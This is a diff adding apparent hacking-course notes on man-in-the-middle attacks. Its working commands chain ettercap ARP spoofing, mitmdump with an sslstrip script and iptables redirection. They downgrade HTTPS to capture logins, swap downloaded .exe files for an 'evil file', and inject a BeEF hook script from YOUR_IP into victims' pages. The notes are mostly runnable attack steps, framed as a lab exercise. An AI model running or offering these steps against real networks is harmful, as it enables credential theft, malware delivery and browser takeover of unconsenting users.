@@ -1,0 +1,46 @@
+### Bypassing HTTPS with mitmproxy
+==================================
+# Everything we didso far will NOT work against HTTPS pages. HTTPS data is encrypted using SSL. Data can NOT be read and modified. SSLstrip can NOT be used because mitmproxy can not work with another transparent proxy (sslstrip). Solution is to use a mitmproxy script to bypass https.
+
+# Complex script: https://github.com/mitmproxy/mitmproxy/tree/v2.0.2/examples/complex
+# Download these script to the same directory as mitm proxy. /opt/mitmproxy
+
+# do and arp spoofing attack first
+ettercap -Tq -M arp:remote -i eth0 -S /TARGET// /GATEWAY//
+# run the mitmproxy with sslstrip script
+./mitmdump -s sslstrip.py --transparent
+# run following to redirect traffic throw our mitmproxy
+iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 8080
+
+# Lets go to the victim machine and browse for example for hotmail.com and you should see that the connection was downgraded to http. After you try to type some email and pass you should be able to capture it in the hacker machine.
+
+### Replacing downloads from HTTPS
+==================================
+# On the target machine we will try to download some file from https website, for example rarlab.com with https and winzip.com with http. We use similar steps as in previous page, but with multiple scripts.
+
+# Content of script2.py is the same as described in Network hacking - Custom attack script section.
+
+# do and arp spoofing attack first
+ettercap -Tq -M arp:remote -i eth0 -S /TARGET// /GATEWAY//
+# run the mitmproxy with sslstrip script
+./mitmdump -s sslstrip.py -s script2.py --transparent
+# run following to redirect traffic throw our mitmproxy
+iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 8080
+
+# Lets go to the victim browser, delete browser cache data and try to donwload a file (exe … you must have setup correctly the script2.py to replacing .exe files with evil file) from winzip.com and then from rlab.com. The rlab.com webpage now should be downgraded from https to http.
+
+### Injecting data into HTTPS websites
+======================================
+First of all run BeEF.
+
+# do and arp spoofing attack first
+ettercap -Tq -M arp:remote -i eth0 -S /TARGET// /GATEWAY//
+
+# run the mitmproxy with sslstrip script and the replacment as in previous sections
+# this will automatically add the BeEF hook script at the end of page
+./mitmdump -s sslstrip.py  --transparent  --replace :~s:"</body>": "<script src="http://YOUR_IP:3000/hook.js"></script></body>"
+
+# run following to redirect traffic throw our mitmproxy
+iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 8080
+
+Now lets go to the victim machine, go to some page and you should see this machine in BeEF web gui on hacker machine in online browsers.
